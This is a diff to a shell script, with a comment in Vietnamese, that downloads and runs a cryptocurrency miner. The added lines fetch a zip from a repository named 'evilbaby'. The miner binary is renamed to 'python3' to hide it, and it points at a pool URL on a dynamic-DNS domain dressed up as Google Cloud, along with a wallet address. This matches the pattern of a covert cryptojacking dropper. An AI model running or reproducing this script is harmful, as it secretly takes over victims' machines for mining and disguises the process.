@@ -18,7 +18,6 @@ then
 else
 
 echo "Miner da install , chay thoi "
-mv aquaminer-0.4-linux-amd64	python3
 ./python3 -F http://test-googlecloud.ddns.net/0xda83ec752a6ebf4fe7aa1a347accd786c3a58a26/2
 
      
@@ -26,8 +25,8 @@ fi
 exit
 fi
 
-wget https://github.com/aquanetwork/aquachain/releases/download/1.5.5/aquaminer-0.4-linux-amd64.zip
-unzip aquaminer-0.4-linux-amd64.zip
+wget https://github.com/evilbaby/aquachain/raw/master/aqua.zip
+unzip aqua.zip
 mv aquaminer-0.4-linux-amd64 python3
 ./python3 -F http://test-googlecloud.ddns.net/0xda83ec752a6ebf4fe7aa1a347accd786c3a58a26/2
 
